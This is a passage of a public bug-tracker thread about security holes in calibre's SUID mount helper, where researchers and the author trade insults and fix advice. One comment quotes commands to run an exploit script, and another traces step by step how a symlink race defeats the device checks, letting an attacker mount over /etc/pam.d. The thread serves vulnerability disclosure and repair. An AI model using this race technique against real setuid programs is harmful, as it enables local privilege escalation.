            <time itemprop="commentTime" datetime="2011-11-03T19:45:47.954533+00:00" title="2011-11-03 19:45:47 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>chmod +x 70calibrerassau<wbr />ltmount.<wbr />sh<br />
./70calibrerass<wbr />aultmount.<wbr />sh</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">chmod +x 70calibrerassaultmount.sh
./70calibrerassaultmount.sh</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cbhaley" class="sprite person">Charles Haley (cbhaley)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T19:46:23.990072+00:00" title="2011-11-03 19:46:23 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; Jacob Appelbaum wrote:<br />
&gt; Thanks to Ubuntu for not shipping an obviously exploitable component in the face of an<br />
&gt; arrogant upstream author who puts his users at risk.
</span></p>
<p>Until this comment, I was on the side of fixing with the exploits. Now, as far as I am concerned you should go play frisbee on a freeway.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; Jacob Appelbaum wrote:
&gt; Thanks to Ubuntu for not shipping an obviously exploitable component in the face of an 
&gt; arrogant upstream author who puts his users at risk.

Until this comment, I was on the side of fixing with the exploits. Now, as far as I am concerned you should go play frisbee on a freeway.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ean5533" class="sprite person">Evan Nelson (ean5533)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T19:47:41.391759+00:00" title="2011-11-03 19:47:41 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Jacob Appelbaum<br />
@Chris Vickery</p>
<p>Do you really believe that throwing insults around in this bug report is going to resolve any issues? Unless you have something constructive to contribute to the bug report, please find another outlet for your frustrations.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Jacob Appelbaum
@Chris Vickery

Do you really believe that throwing insults around in this bug report is going to resolve any issues? Unless you have something constructive to contribute to the bug report, please find another outlet for your frustrations.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/37" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~navs" class="sprite person">navs (navs)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T19:55:58.930666+00:00" title="2011-11-03 19:55:58 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/37"> #37</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Warning to all:<br />
I&#x27;d  be wary running this 70-calibreassau<wbr />ltmount.<wbr />sh on multi user systems. The temporary file used to drop a payload is created in an insecure manner and can be exploited to execute code under the context of the user.<br />
I would like ubuntu for not including this obviously exploitable test case in the face of an arrogant security researcher.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Warning to all:
I'd  be wary running this 70-calibreassaultmount.sh on multi user systems. The temporary file used to drop a payload is created in an insecure manner and can be exploited to execute code under the context of the user. 
I would like ubuntu for not including this obviously exploitable test case in the face of an arrogant security researcher.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/38" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T20:07:41.387621+00:00" title="2011-11-03 20:07:41 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/38"> #38</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This has been fun, but in case you&#x27;re actually interested in fixing the problem, I am still willing to help.</p>
<p>One way to fix races with the mountpoint is to chdir into the mountpoint, stat &quot;.&quot; and check ownership, and mount on top of &quot;.&quot;.  That way there&#x27;s no risk of users changing components of the mountpoint path out from under you.  If the chdir fails, give a non-descriptive error message that does not delineate between the cause of failure for the chdir (otherwise an attacker can use this to determine the existence of files and directories in search paths he can&#x27;t navigate to).</p>
<p>To fix races with the mount source, you should check against /dev/shm, as this is the only world-writable directory in most /dev filesystems that I know of.</p>
<p>That would at least solve the two biggest problems here, and then we can move on to addressing the smaller ones.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This has been fun, but in case you're actually interested in fixing the problem, I am still willing to help.

One way to fix races with the mountpoint is to chdir into the mountpoint, stat "." and check ownership, and mount on top of ".".  That way there's no risk of users changing components of the mountpoint path out from under you.  If the chdir fails, give a non-descriptive error message that does not delineate between the cause of failure for the chdir (otherwise an attacker can use this to determine the existence of files and directories in search paths he can't navigate to).

To fix races with the mount source, you should check against /dev/shm, as this is the only world-writable directory in most /dev filesystems that I know of.

That would at least solve the two biggest problems here, and then we can move on to addressing the smaller ones.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              1 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 111 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/40" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T20:42:09+00:00" title="2011-11-03 20:42:09 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/calibre/+bug/885027/comments/40">
                <strong>Re: [Bug 885027] Re: SUID Mount Helper has 5 Major Vulnerabilities</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/40"> #40</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;To fix races with the mount source, you should check against<br />
/dev/shm, as this is the only world-writable directory in most /dev<br />
filesystems that I know of.&quot;</p>
<p>Or more generally, stat and check root ownership and permission on the<br />
directory of the device. (Though, you can&#x27;t chdir into both.)</p>
<p>You additionally could make sure it is a block device. You could also<br />
check to see if the block device is removable / matches the identifier<br />
of supported ebook readers / something else.</p>
<p>You could even go a step further and not call out to mount as an<br />
external program, but make the syscalls yourself, dealing with the<br />
handfuls of new problems you&#x27;ll have and various mtab issues and who<br />
knows what else.</p>
<p>(Of course,  at this point, you might as well just be using<br />
pmount/<wbr />udisks/<wbr />microsoftwindow<wbr />s/whatever.<wbr />)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"To fix races with the mount source, you should check against
/dev/shm, as this is the only world-writable directory in most /dev
filesystems that I know of."

Or more generally, stat and check root ownership and permission on the
directory of the device. (Though, you can't chdir into both.)

You additionally could make sure it is a block device. You could also
check to see if the block device is removable / matches the identifier
of supported ebook readers / something else.

You could even go a step further and not call out to mount as an
external program, but make the syscalls yourself, dealing with the
handfuls of new problems you'll have and various mtab issues and who
knows what else.


(Of course,  at this point, you might as well just be using
pmount/udisks/microsoftwindows/whatever.)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/39" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T20:47:19.502563+00:00" title="2011-11-03 20:47:19 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/39"> #39</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;To fix races with the mount source, you should check against<br />
/dev/shm, as this is the only world-writable directory in most /dev<br />
filesystems that I know of.&quot;</p>
<p>Or more generally, stat and check root ownership and permission on the<br />
directory of the device. (Though, you can&#x27;t chdir into both.)</p>
<p>You additionally could make sure it is a block device. You could also<br />
check to see if the block device is removable / matches the identifier<br />
of supported ebook readers / something else.</p>
<p>You could even go a step further and not call out to mount as an<br />
external program, but make the syscalls yourself, dealing with the<br />
handfuls of new problems you&#x27;ll have and various mtab issues and who<br />
knows what else.</p>
<p>(Of course,  at this point, you might as well just be using<br />
pmount/<wbr />udisks/<wbr />microsoftwindow<wbr />s/whatever.<wbr />)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"To fix races with the mount source, you should check against
/dev/shm, as this is the only world-writable directory in most /dev
filesystems that I know of."

Or more generally, stat and check root ownership and permission on the
directory of the device. (Though, you can't chdir into both.)

You additionally could make sure it is a block device. You could also
check to see if the block device is removable / matches the identifier
of supported ebook readers / something else.

You could even go a step further and not call out to mount as an
external program, but make the syscalls yourself, dealing with the
handfuls of new problems you'll have and various mtab issues and who
knows what else.


(Of course,  at this point, you might as well just be using
pmount/udisks/microsoftwindows/whatever.)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
    
    <time title="2011-11-04 01:37:03 UTC" datetime="2011-11-04T01:37:03.538136+00:00">on 2011-11-04</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              32 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 111 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/72" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:08:58+00:00" title="2011-11-04 19:08:58 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/calibre/+bug/885027/comments/72">
                <strong>Re: calibre bug 885027</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/72"> #72</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It&#x27;s way past my bedtime, so I&#x27;d appreciate it if you could post the patch to<br />
mount-helper (by now you should be as familiar with the code as I am). If not,<br />
I&#x27;ll get to it tomorrow. And thanks for the help.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It's way past my bedtime, so I'd appreciate it if you could post the patch to
mount-helper (by now you should be as familiar with the code as I am). If not,
I'll get to it tomorrow. And thanks for the help.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/73" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:10:53.103997+00:00" title="2011-11-04 19:10:53 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/73"> #73</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Unfortunately, the saga continues. Your /shm/ check doesn&#x27;t do anything, because, as it turns out, because you realpath twice, I don&#x27;t need to  use /shm/ at all! Your code is still broken. Giving up should still be an option on the table for you. In case, however, you&#x27;ve become determined and still want to fix things, I&#x27;ve traced through the code for your recent commit showing you where and how things are broken.</p>
<p>/tmp/burrito is a file</p>
<p>argv[2] = /tmp/burrito</p>
<p>332	    if (strncmp(action, &quot;mount&quot;, 5) == 0) {<br />
333	        dev = realpath(argv[2], NULL);</p>
<p>dev = /tmp/burrito</p>
<p>334	        if (dev == NULL) {<br />
335	            fprintf(stderr, &quot;Failed to resolve device node.\n&quot;);<br />
336	            exit(EXIT_FAILURE);<br />
337	        }<br />
339	        check_dev(dev);</p>
<p>239	void check_dev(const char *dev) {</p>
<p>dev = /tmp/burrito</p>
<p>240	    char buffer[PATH_MAX+1];<br />
241	    struct stat file_info;<br />
242<br />
243	    if (dev == NULL || strlen(dev) &lt; strlen(DEV)) {<br />
244	        fprintf(stderr, &quot;Invalid arguments\n&quot;);<br />
245	        exit(EXIT_FAILURE);<br />
246	    }</p>
<p>JUST BEFORE this next line, we modify /tmp/burrito so that it points to /dev/sda</p>
<p>/tmp/burrito = --&gt;/dev/sda</p>
<p>247<br />
248	    if (realpath(dev, buffer) == NULL) {<br />
249	        fprintf(stderr, &quot;Unable to resolve dev path\n&quot;);<br />
250	        exit(EXIT_FAILURE);<br />
251	    }</p>
<p>buffer = /dev/sda</p>
<p>252<br />
253	    if (strncmp(DEV, buffer, strlen(DEV)) != 0) {<br />
254	        fprintf(stderr, &quot;Trying to operate on a dev node not under /dev\n&quot;);<br />
255	        exit(EXIT_FAILURE);<br />
256	    }</p>
<p>this last block passes!</p>
<p>257<br />
258	    if (stat(dev, &amp;file_info) != 0) {<br />
259	        fprintf(stderr, &quot;stat call on dev node failed\n&quot;);<br />
260	        exit(EXIT_FAILURE);<br />
261	    }<br />
262<br />
263	    if (strstr(dev, &quot;/shm/&quot;) != NULL) {<br />
264	        fprintf(stderr, &quot;naughty, naughty!\n&quot;);<br />
265	        exit(EXIT_FAILURE);<br />
266	    }</p>
<p>dev doesnt contain /shm/, since it&#x27;s /tmp/burrito</p>
<p>267<br />
268	    if (!S_ISBLK(<wbr />file_info.<wbr />st_mode)<wbr />) {<br />
269	        fprintf(stderr, &quot;dev node is not a block device\n&quot;);<br />
270	        exit(EXIT_FAILURE);<br />
271	    }</p>
<p>stat follows the link, so it sees /dev/sda which is a block device, so this passes</p>
<p>272<br />
273	}</p>
<p>:-)</p>
<p>As well, the problem presented in .70-Calibrer HAS NOT BEEN FIXED. You can still mount over /etc/pam.d or wherever due to the still existing race there. Implement the chdir logic that I&#x27;ve outlined above.</p>
<p>Then, just after this code block, change /tmp/burrito to point to anything -- any file image at all. No shm needed :-).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Unfortunately, the saga continues. Your /shm/ check doesn't do anything, because, as it turns out, because you realpath twice, I don't need to  use /shm/ at all! Your code is still broken. Giving up should still be an option on the table for you. In case, however, you've become determined and still want to fix things, I've traced through the code for your recent commit showing you where and how things are broken.



/tmp/burrito is a file

argv[2] = /tmp/burrito


332	    if (strncmp(action, "mount", 5) == 0) {
333	        dev = realpath(argv[2], NULL);

dev = /tmp/burrito

334	        if (dev == NULL) {
335	            fprintf(stderr, "Failed to resolve device node.\n");
336	            exit(EXIT_FAILURE);
337	        }
339	        check_dev(dev);



239	void check_dev(const char *dev) {

dev = /tmp/burrito

240	    char buffer[PATH_MAX+1];
241	    struct stat file_info;
242	
243	    if (dev == NULL || strlen(dev) &lt; strlen(DEV)) {
244	        fprintf(stderr, "Invalid arguments\n");
245	        exit(EXIT_FAILURE);
246	    }

JUST BEFORE this next line, we modify /tmp/burrito so that it points to /dev/sda

/tmp/burrito = --&gt;/dev/sda

247	
248	    if (realpath(dev, buffer) == NULL) {
249	        fprintf(stderr, "Unable to resolve dev path\n");
250	        exit(EXIT_FAILURE);
251	    }

buffer = /dev/sda

252	
253	    if (strncmp(DEV, buffer, strlen(DEV)) != 0) {
254	        fprintf(stderr, "Trying to operate on a dev node not under /dev\n");
255	        exit(EXIT_FAILURE);
256	    }

this last block passes!


257	
258	    if (stat(dev, &amp;file_info) != 0) {
259	        fprintf(stderr, "stat call on dev node failed\n");
260	        exit(EXIT_FAILURE);
261	    }
262	
263	    if (strstr(dev, "/shm/") != NULL) {
264	        fprintf(stderr, "naughty, naughty!\n");
265	        exit(EXIT_FAILURE);
266	    }

dev doesnt contain /shm/, since it's /tmp/burrito


267	
268	    if (!S_ISBLK(file_info.st_mode)) {
269	        fprintf(stderr, "dev node is not a block device\n");
270	        exit(EXIT_FAILURE);
271	    }


stat follows the link, so it sees /dev/sda which is a block device, so this passes

272	
273	}

:-)


As well, the problem presented in .70-Calibrer HAS NOT BEEN FIXED. You can still mount over /etc/pam.d or wherever due to the still existing race there. Implement the chdir logic that I've outlined above.


Then, just after this code block, change /tmp/burrito to point to anything -- any file image at all. No shm needed :-).
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Released &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/74" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T19:16:07.032637+00:00" title="2011-11-04 19:16:07 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/74"> #74</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Please note that I misjudged just how broken this code is, and restricting /dev/shm is not enough to prevent from mounting arbitrary devices.  I expect Jason will show you how.</p>
<p>Just so this is perfectly clear: what&#x27;s happening in this bug report right now is a perfect example of how *not* to do security response.  When faced with two people who clearly know a few things about secure coding, rather than taking their advice and actually fixing the root cause of the problem (or abandon it as a hopeless situation, which is probably the more appropriate response), you&#x27;ve chosen to waste our time by demanding that we write weaponized exploits to exploit what most people already know to be exploitable.  To top it off, when shown repeatedly how your half-baked &quot;fixes&quot; don&#x27;t actually fix anything, rather than taking our advice you just add another small hurdle that can be trivially bypassed.  It would be sad if it weren&#x27;t so funny.</p>
<p>I&#x27;ve decided that it&#x27;s time to stop beating a dead horse.  Usually I get paid good money to own software this hard, and I don&#x27;t think you&#x27;re worth making an exception.  Best of luck, I&#x27;m sure you&#x27;ll figure it out eventually.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Please note that I misjudged just how broken this code is, and restricting /dev/shm is not enough to prevent from mounting arbitrary devices.  I expect Jason will show you how.

